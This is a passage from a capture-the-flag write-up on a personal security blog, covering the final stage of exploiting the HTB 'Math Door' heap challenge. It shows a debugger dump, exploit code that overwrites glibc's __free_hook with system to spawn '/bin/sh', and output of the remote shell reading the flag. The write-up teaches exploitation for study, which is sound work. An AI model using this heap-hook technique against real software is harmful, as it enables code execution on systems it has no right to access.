+<span class="code-dark-blue">0x55d9349ee200</span> &lt;<span class="code-dark-yellow">chunks</span>+416&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x55d9349ee210</span> &lt;<span class="code-dark-yellow">chunks</span>+432&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x55d9349ee220</span> &lt;<span class="code-dark-yellow">chunks</span>+448&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x55d9349ee230</span> &lt;<span class="code-dark-yellow">chunks</span>+464&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x55d9349ee240</span> &lt;<span class="code-dark-yellow">chunks</span>+480&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x55d9349ee250</span> &lt;<span class="code-dark-yellow">chunks</span>+496&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>x 0x00007f1776370e48
+<span class="code-dark-blue">0x7f1776370e48</span> &lt;<span class="code-dark-yellow">__free_hook</span>&gt;:   0x0000000000000000
+</code></pre></div><p>So, we only need to enter the address of <code>system</code> (no offsets needed because the current value here is <code>0</code>). Then, we will enter <code>"/bin/sh\0"</code> as a number in any chunk, so that calling <code>free</code> on it will actually call <code>system</code> on the chunk, which will contain the string <code>"/bin/sh\0"</code>.</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">M</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1">, </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>  
+<span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">25</span><span class="mtk1">, u64(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">), </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">25</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">(</span><span class="mtk9 mtki">timeout</span><span class="mtk5">=</span><span class="mtk6">2</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+</code></pre></div><p>And with this, we get a shell locally:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './math-door'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'.'</span>
+[<span class="code-green">+</span>] Starting local process './math-door': pid 385181  
+[<span class="code-blue">*</span>] Glibc leak: 0x7f8fdee167e0
+[<span class="code-green">+</span>] Glibc base address: 0x7f8fdec28000
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> whoami
+rocky
+</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s go remote:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 68.183.45.143:32186
+[<span class="code-blue">*</span>] './math-door'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'.'</span>
+[<span class="code-green">+</span>] Opening connection to 68.183.45.143 on port 32186: Done  
+[<span class="code-blue">*</span>] Glibc leak: 0x7f2c8d1e67e0
+[<span class="code-green">+</span>] Glibc base address: 0x7f2c8cff8000
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+bin
+dev
+flag.txt
+ld.so
+lib
+lib32
+lib64
+libc.so.6
+math-door
+<span class="code-red">$</span> cat flag.txt
+HTB{y0ur_m4th_1s_fr0m_4n0th3r_w0rld!}
+</code></pre></div><p>The full exploit code is here: <a href="https://github.com/7Rocky/CTF-scripts/tree/main/HTB%20Cyber%20Apocalypse/Pwn/Math%20Door/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#setup-environment">Setup environment</a></li><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#allocation-function">Allocation function</a></li><li><a href="#free-function">Free function</a></li><li><a href="#edit-function">Edit function</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#heap-_feng-shui_">Heap <em>feng shui</em></a></li><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
